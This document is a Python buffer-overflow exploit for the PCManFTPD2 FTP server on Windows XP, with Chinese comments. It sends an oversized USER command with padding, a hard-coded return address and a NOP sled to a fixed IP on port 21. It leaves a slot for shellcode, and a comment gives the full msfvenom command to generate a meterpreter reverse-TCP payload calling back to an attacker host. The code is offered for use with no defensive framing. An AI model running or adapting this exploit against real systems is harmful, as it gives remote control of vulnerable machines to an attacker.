#!/usr/bin/env python3

# 环境:windowsxp,PCManFTPD2
# 替换cmd命令可执行命令
# 用msf生成shellcode赋值到buf可远程控制
# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 1 -b '\x00\x0a\x0d\xff' lhost=192.168.10.30 lport=5555 -f python -o shell.py

import socket
# ip
host = "192.168.100.98"
# 端口
port = 21
# shellcode填入此处32位
shellcode = b""

buf = shellcode

nop = b'\x90' * 20
ret = b'\x12\x45\xfa\x7f'

if len(host) == 15:
    pattern = b"A" * 1000 + b"B" * 1001 + ret + nop + buf
else:
    pattern = b"A" * 1000 + b"B" * 1002 + ret + nop + buf

exploit_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit_socket.connect((host, port))
exploit_socket.recv(1024)
exploit_socket.send(b"USER " + pattern)
exploit_socket.close()
